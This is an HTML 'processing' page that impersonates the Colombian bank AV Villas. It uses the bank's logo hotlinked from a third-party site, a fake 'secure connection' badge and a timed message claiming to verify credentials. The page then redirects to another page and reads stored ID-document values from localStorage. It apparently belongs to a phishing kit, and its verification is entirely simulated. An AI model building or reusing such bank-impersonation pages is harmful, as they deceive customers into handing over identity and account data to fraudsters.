<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando - AV Villas</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .loading-container {
            text-align: center;
            padding: 40px;
            max-width: 500px;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo {
            margin-bottom: 60px;
        }

        .logo img {
            height: 120px;
            width: auto;
        }

        /* Simple elegant loader */
        .loader-wrapper {
            margin: 0 auto 40px;
            width: 100px;
            height: 100px;
        }

        .loader {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 5px solid #f0f0f0;
            border-top-color: #ED1C24;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            font-size: 26px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 400;
        }

        .loading-subtext {
            font-size: 16px;
            color: #666;
            margin-bottom: 40px;
        }

        .dots {
            display: inline-block;
        }

        .dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #ED1C24;
            margin: 0 2px;
            animation: dotBounce 1.4s infinite ease-in-out;
        }

        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes dotBounce {
            0%, 80%, 100% {
                transform: scale(0);
                opacity: 0.5;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #4CAF50;
            font-size: 14px;
            margin-top: 30px;
        }

        .security-icon {
            width: 20px;
            height: 20px;
            fill: #4CAF50;
        }

        @media (max-width: 480px) {
            .logo img {
                height: 100px;
            }

            .loading-text {
                font-size: 22px;
            }

            .loader-wrapper {
                width: 80px;
                height: 80px;
            }

            .loader {
                width: 80px;
                height: 80px;
            }
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="logo">
            <img src="https://cosmocentro.com/wp-content/uploads/2017/01/LOGO-AV-VILLAS-CON-CONTENEDOR.png" alt="AV Villas">
        </div>

        <div class="loader-wrapper">
            <div class="loader"></div>
        </div>

        <h2 class="loading-text" id="loadingTitle">Validando información</h2>
        
        <p class="loading-subtext">
            Por favor espera un momento<span class="dots">
                <span class="dot"></span>
                <span class="dot"></span>
                <span class="dot"></span>
            </span>
        </p>

        <div class="security-badge">
            <svg class="security-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
            </svg>
            <span>Conexión segura</span>
        </div>
    </div>

    <script>
        const loadingTitle = document.getElementById('loadingTitle');

        // Cambiar mensaje a la mitad
        setTimeout(() => {
            loadingTitle.textContent = 'Verificando credenciales';
        }, 5000);

        // Redirigir después de 10 segundos
        setTimeout(() => {
            window.location.href = 'product.html';
        }, 10000);

        // Leer datos del localStorage
        const userData = {
            docType: localStorage.getItem('avvillas_docType'),
            docNumber: localStorage.getItem('avvillas_docNumber'),
            timestamp: localStorage.getItem('avvillas_timestamp')
        };
        
        console.log('Procesando usuario:', userData);
    </script>
</body>
</html>
